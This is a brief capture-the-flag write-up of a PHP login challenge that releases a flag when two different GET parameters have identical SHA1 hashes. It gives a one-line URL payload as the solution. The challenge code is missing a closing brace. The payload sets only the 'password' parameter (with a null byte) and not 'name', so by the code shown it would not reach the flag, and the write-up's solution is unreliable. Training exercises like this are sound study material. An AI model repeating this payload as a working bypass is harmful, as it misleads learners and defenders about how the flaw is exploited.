# Challenge 
```php
<?php
if (isset($_GET['name']) and isset($_GET['password'])) {
    if ($_GET['name'] == $_GET['password'])
        echo '<p>Your password can not be your name!</p>';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
      die('Flag: '.$flag);
    else
        echo '<p>Invalid password.</p>';
}
else{
	echo '<p>Login first!</p>';
?>
```
# Solution
payload:
```
?password=9e9%00*-*
```

# Refference
+ [chybeta : FALSE](https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/#Once-More)